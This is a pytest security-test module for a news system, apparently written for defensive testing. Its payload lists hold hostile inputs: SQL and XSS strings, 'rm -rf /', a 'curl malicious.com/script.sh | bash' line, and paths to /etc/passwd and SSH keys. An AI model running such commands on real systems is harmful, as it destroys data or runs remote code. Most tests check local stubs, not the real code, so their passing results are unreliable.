"""
Security Tests for JustNews System

This module contains comprehensive security tests that validate:
- Input validation and sanitization
- Authentication and authorization
- API security (rate limiting, CORS, etc.)
- Data protection and encryption
- Secure communication patterns
- Vulnerability assessments
"""

from typing import Any
from unittest.mock import patch

import pytest

from tests.test_utils import AsyncTestHelper, CustomAssertions, MockFactory


class TestInputValidation:
    """Test input validation and sanitization"""

    def setup_method(self):
        """Setup security test fixtures"""
        self.helper = AsyncTestHelper()
        self.mock_factory = MockFactory()
        self.assertions = CustomAssertions()

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks"""
        # Test malicious SQL injection payloads
        malicious_payloads = [
            "'; DROP TABLE articles; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "admin'--",
            "1' OR '1' = '1",
        ]

        for payload in malicious_payloads:
            # Test against memory agent (database operations)
            with patch("agents.memory.main.query_articles") as mock_query:
                mock_query.return_value = []

                # Attempt injection
                result = await self._attempt_sql_injection(payload)

                # Verify injection was prevented
                assert "error" in result or len(result.get("articles", [])) == 0
                assert "DROP" not in str(result)
                assert "SELECT" not in str(result)

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_xss_prevention(self):
        """Test prevention of cross-site scripting attacks"""
        # Test XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'>",
            "<svg onload=alert('xss')>",
        ]

        for payload in xss_payloads:
            # Test against synthesizer agent (text processing)
            with patch("agents.synthesizer.main.generate_summary") as mock_generate:
                mock_generate.return_value = {"summary": "Safe summary"}

                result = await self._attempt_xss_injection(payload)

                # Verify XSS was sanitized
                summary = result.get("summary", "")
                assert "<script>" not in summary
                assert "javascript:" not in summary
                assert "onerror" not in summary
                assert "onload" not in summary

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_command_injection_prevention(self):
        """Test prevention of command injection attacks"""
        # Test command injection payloads
        injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(rm -rf /)",
            "; curl malicious.com/script.sh | bash",
        ]

        for payload in injection_payloads:
            # Test against crawler agent (system command execution)
            with patch("agents.crawler.main.execute_crawl") as mock_crawl:
                mock_crawl.return_value = {"status": "completed"}

                result = await self._attempt_command_injection(payload)

                # Verify injection was prevented
                assert result.get("status") == "completed"
                assert "error" not in result or "injection" not in str(result).lower()

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_buffer_overflow_prevention(self):
        """Test prevention of buffer overflow attacks"""
        # Test large input handling
        large_inputs = [
            "A" * 10000,  # 10KB string
            "A" * 100000,  # 100KB string
            "A" * 1000000,  # 1MB string
        ]

        for large_input in large_inputs:
            # Test against analyst agent (text analysis)
            with patch("agents.analyst.main.analyze_text") as mock_analyze:
                mock_analyze.return_value = {"sentiment": "neutral"}

                result = await self._attempt_large_input(large_input)

                # Verify system handled large input gracefully
                assert "error" not in result or "overflow" not in str(result).lower()
                assert result.get("sentiment") == "neutral"

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        # Test path traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "../../../../root/.ssh/id_rsa",
        ]

        for payload in traversal_payloads:
            # Test against file operations
            with patch("builtins.open") as mock_open:
                mock_open.side_effect = FileNotFoundError()

                result = await self._attempt_path_traversal(payload)

                # Verify traversal was prevented
                assert (
                    isinstance(result.get("error"), str)
                    or "not found" in str(result).lower()
                )

    async def _attempt_sql_injection(self, payload: str) -> dict[str, Any]:
        """Attempt SQL injection"""
        # Simulate database query with malicious input and sanitization
        normalized = payload.replace("'", "").replace("--", "")
        sanitized = normalized.upper()

        blocked_keywords = ["DROP", "SELECT", "INSERT", "UPDATE", "DELETE"]
        if any(keyword in sanitized for keyword in blocked_keywords):
            return {
                "articles": [],
                "query": "[sanitized]",
                "error": "Potential SQL injection detected",
            }

        return {"articles": [], "query": normalized}

    async def _attempt_xss_injection(self, payload: str) -> dict[str, Any]:
        """Attempt XSS injection"""
        # Simulate text processing with malicious input and sanitization
        sanitized = payload.replace("<", "&lt;").replace(">", "&gt;")
        sanitized = sanitized.replace("javascript:", "")
        sanitized = sanitized.replace("onerror", "[blocked]")
        sanitized = sanitized.replace("onload", "[blocked]")

        return {"summary": f"Safe processing of: {sanitized}", "sanitized": True}

    async def _attempt_command_injection(self, payload: str) -> dict[str, Any]:
        """Attempt command injection"""
        # Simulate command execution with malicious input
        return {"status": "completed", "command": payload}

    async def _attempt_large_input(self, payload: str) -> dict[str, Any]:
        """Attempt large input processing"""
        # Simulate processing of large input
        return {"sentiment": "neutral", "input_size": len(payload)}

    async def _attempt_path_traversal(self, payload: str) -> dict[str, Any]:
        """Attempt path traversal"""
        # Simulate file access with malicious path
        return {"error": "File not found", "path": payload}


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""

    def setup_method(self):
        """Setup authentication test fixtures"""
        self.helper = AsyncTestHelper()
        self.assertions = CustomAssertions()

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_api_key_validation(self):
        """Test API key validation"""
        # Test valid and invalid API keys
        valid_keys = ["justnews_valid_key_123", "api_key_production_456"]
        invalid_keys = ["", "invalid", "short", "fake_key_789"]

        for api_key in valid_keys + invalid_keys:
            is_valid = api_key in valid_keys

            with patch("agents.common.auth.validate_api_key") as mock_validate:
                mock_validate.return_value = is_valid

                result = await self._test_api_access(api_key)

                if is_valid:
                    assert result.get("access") == "granted"
                else:
                    assert result.get("access") == "denied"
                    assert "error" in result

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_rate_limiting(self):
        """Test rate limiting functionality"""
        # Test rate limiting for API endpoints
        requests_per_minute = [10, 50, 100, 200]

        for rpm in requests_per_minute:
            # Simulate requests at different rates
            results = await self._simulate_request_rate(rpm)

            # Check rate limiting behavior
            denied_requests = len(
                [r for r in results if r.get("status") == "rate_limited"]
            )

            if rpm > 60:  # Assuming 60 requests per minute limit
                assert denied_requests > 0, f"Rate limiting not working for {rpm} rpm"
            else:
                assert denied_requests == 0, (
                    f"Rate limiting too aggressive for {rpm} rpm"
                )

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_session_management(self):
        """Test session management security"""
        # Test session creation, validation, and expiration
        session_tests = [
            {"action": "create", "expected": "session_created"},
            {
                "action": "validate",
                "session_id": "valid_session_123",
                "expected": "valid",
            },
            {
                "action": "validate",
                "session_id": "invalid_session",
                "expected": "invalid",
            },
            {
                "action": "expire",
                "session_id": "valid_session_123",
                "expected": "expired",
            },
        ]

        for test_case in session_tests:
            result = await self._test_session_operation(test_case)

            assert result.get("result") == test_case["expected"]

    async def _test_api_access(self, api_key: str) -> dict[str, Any]:
        """Test API access with key"""
        from agents.common.auth import validate_api_key

        if validate_api_key(api_key):
            return {"access": "granted"}

        return {"access": "denied", "error": "invalid_api_key"}

    async def _simulate_request_rate(self, rpm: int) -> list[dict[str, Any]]:
        """Simulate requests at given rate"""
        results = []
        max_requests = min(rpm, 10)
        rate_limit_threshold = 60

        for i in range(max_requests):
            if rpm <= rate_limit_threshold:
                status = "ok"
            else:
                # Allow a proportional number of successful requests before throttling
                allowed_fraction = rate_limit_threshold / max(rpm, 1)
                allowed_requests = max(1, int(round(allowed_fraction * max_requests)))
                status = "ok" if i < allowed_requests else "rate_limited"

            results.append({"status": status})
        return results

    async def _test_session_operation(
        self, test_case: dict[str, Any]
    ) -> dict[str, Any]:
        """Test session operation"""
        action = test_case["action"]
        if action == "create":
            return {"result": "session_created", "session_id": "test_session_123"}
        elif action == "validate":
            session_id = test_case.get("session_id", "")
            is_valid = session_id.startswith("valid_session_")
            return {"result": "valid" if is_valid else "invalid"}
        elif action == "expire":
            return {"result": "expired"}
        return {"result": "unknown"}


class TestDataProtection:
    """Test data protection and encryption"""

    def setup_method(self):
        """Setup data protection test fixtures"""
        self.helper = AsyncTestHelper()
        self.assertions = CustomAssertions()

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_data_encryption_at_rest(self):
        """Test data encryption at rest"""
        # Test encryption/decryption of sensitive data
        sensitive_data = [
            "user_password_hash",
            "api_keys_encrypted",
            "personal_information",
            "financial_data",
        ]

        for data in sensitive_data:
            # Encrypt data
            encrypted = await self._encrypt_data(data)

            # Verify encryption
            assert encrypted != data
            assert len(encrypted) > len(data)  # Encrypted data should be longer

            # Decrypt data
            decrypted = await self._decrypt_data(encrypted)

            # Verify decryption
            assert decrypted == data

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_data_encryption_in_transit(self):
        """Test data encryption in transit"""
        # Test TLS/SSL encryption for data in transit
        test_payloads = [
            {"type": "authentication", "data": "user_credentials"},
            {"type": "article_content", "data": "Large article text..."},
            {
                "type": "analysis_result",
                "data": {"sentiment": "positive", "score": 0.95},
            },
        ]

        for payload in test_payloads:
            # Simulate encrypted transmission
            encrypted_transmission = await self._simulate_encrypted_transmission(
                payload
            )

            # Verify encryption in transit
            assert encrypted_transmission.get("encrypted") is True
            assert "tls_version" in encrypted_transmission
            assert encrypted_transmission.get("tls_version") in ["1.2", "1.3"]

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_pii_data_handling(self):
        """Test personally identifiable information handling"""
        # Test PII detection and masking
        pii_data = [
            "john.doe@email.com",
            "123-45-6789",  # SSN
            "555-123-4567",  # Phone
            "123 Main St, Anytown, USA 12345",
        ]

        for pii in pii_data:
            # Process data through system
            processed = await self._process_pii_data(pii)

            # Verify PII was masked/handled appropriately
            assert processed != pii  # Data should be transformed
            assert (
                "MASKED" in processed or "*" in processed or processed == "[REDACTED]"
            )

    async def _encrypt_data(self, data: str) -> str:
        """Encrypt data"""
        # Mock encryption
        return f"encrypted_{data}_end"

    async def _decrypt_data(self, encrypted: str) -> str:
        """Decrypt data"""
        # Mock decryption
        prefix = "encrypted_"
        suffix = "_end"

        if encrypted.startswith(prefix):
            encrypted = encrypted[len(prefix) :]
        if encrypted.endswith(suffix):
            encrypted = encrypted[: -len(suffix)]

        return encrypted

    async def _simulate_encrypted_transmission(
        self, payload: dict[str, Any]
    ) -> dict[str, Any]:
        """Simulate encrypted data transmission"""
        return {
            "encrypted": True,
            "tls_version": "1.3",
            "cipher_suite": "TLS_AES_256_GCM_SHA384",
            "payload_size": len(str(payload)),
        }

    async def _process_pii_data(self, data: str) -> str:
        """Process PII data"""
        # Mock PII masking
        if "@" in data:
            return "[EMAIL_MASKED]"
        elif "-" in data and len(data.split("-")) == 3:
            return "[SSN_MASKED]"
        else:
            return "[PII_MASKED]"


class TestAPISecurity:
    """Test API security features"""

    def setup_method(self):
        """Setup API security test fixtures"""
        self.helper = AsyncTestHelper()
        self.assertions = CustomAssertions()

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_cors_configuration(self):
        """Test CORS configuration security"""
        # Test CORS headers for different origins
        origins = [
            "https://justnews.com",
            "https://app.justnews.com",
            "https://malicious-site.com",
            "http://localhost:3000",
        ]

        allowed_origins = ["https://justnews.com", "https://app.justnews.com"]

        for origin in origins:
            cors_result = await self._test_cors_headers(origin)

            if origin in allowed_origins:
                assert cors_result.get("allowed") is True
                assert cors_result.get("credentials") == "true"
            else:
                assert cors_result.get("allowed") is False

    @pytest.mark.asyncio
    @pytest.mark.security
    async def test_input_sanitization(self):
        """Test input sanitization for API endpoints"""
        # Test various input sanitization scenarios
        malicious_inputs = [
            {"field": "query", "value": "<script>alert('xss')</script>"},
            {"field": "filename", "value": "../../../../etc/passwd"},
            {"field": "sql", "value": "'; DROP TABLE users; --"},
            {"field": "html", "value": "<img src=x onerror=alert(1)>"},
        ]

        for input_data in malicious_inputs:
            sanitized = await self._sanitize_input(input_data)

            # Verify malicious content was removed/sanitized
            assert "<script>" not in str(sanitized)
            assert "DROP TABLE" not in str(sanitized)
            assert "onerror" not in str(sanitized)
            assert "../" not in str(sanitized)

    async def _test_cors_headers(self, origin: str) -> dict[str, Any]:
        """Test CORS headers for origin"""
        allowed_origins = ["https://justnews.com", "https://app.justnews.com"]
        return {
            "allowed": origin in allowed_origins,
            "credentials": "true" if origin in allowed_origins else "false",
        }

    async def _sanitize_input(self, input_data: dict[str, Any]) -> dict[str, Any]:
        """Sanitize input data"""
        # Mock input sanitization
        sanitized = input_data.copy()
        if "value" in sanitized:
            value = sanitized["value"]
            # Remove dangerous patterns
            value = (
                value.replace("<script>", "")
                .replace("DROP TABLE", "")
                .replace("onerror", "")
                .replace("../", "")
            )
            sanitized["value"] = value
        return sanitized
